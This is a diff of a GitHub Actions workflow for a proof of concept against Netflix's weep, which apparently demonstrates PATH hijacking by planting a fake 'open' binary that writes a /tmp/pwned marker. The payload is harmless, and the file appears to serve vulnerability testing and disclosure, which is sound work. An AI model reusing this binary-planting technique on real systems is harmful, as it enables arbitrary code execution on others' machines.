@@ -1,29 +1,27 @@
-name: Weep OpenLink PoC
+name: Weep OpenLink Exploit Test
 
-on: [push]
+on:
+  push:
+    branches: [ main ]
 
 jobs:
-  pwn:
+  exploit:
     runs-on: ubuntu-latest
     steps:
+      - name: Checkout
+        uses: actions/checkout@v3
+
       - name: Set up Go
         uses: actions/setup-go@v4
         with:
-          go-version: '1.21'
+          go-version: 1.20
 
-      - name: Create malicious 'open' binary
+      - name: Make fake open binary executable
+        run: chmod +x fakebin/open
+
+      - name: Prepend fakebin to PATH and run PoC
         run: |
-          mkdir -p /tmp/fakebin
-          echo -e '#!/bin/bash\necho "Pwned" > /tmp/pwned' > /tmp/fakebin/open
-          chmod +x /tmp/fakebin/open
-          export PATH=/tmp/fakebin:$PATH
-
-          # Clone weep just for the util
-          git clone https://github.com/Netflix/weep.git
-          cp weep/pkg/util/openlink.go ./
-          
-          # Run main.go
-          go run main.go
-
-          echo "Output:"
-          cat /tmp/pwned || echo "Exploit failed"
+          export PATH="${GITHUB_WORKSPACE}/fakebin:$PATH"
+          echo "[*] PATH is: $PATH"
+          go run cmd/main.go
+          ls -l /tmp/pwned || echo "[-] /tmp/pwned not found"
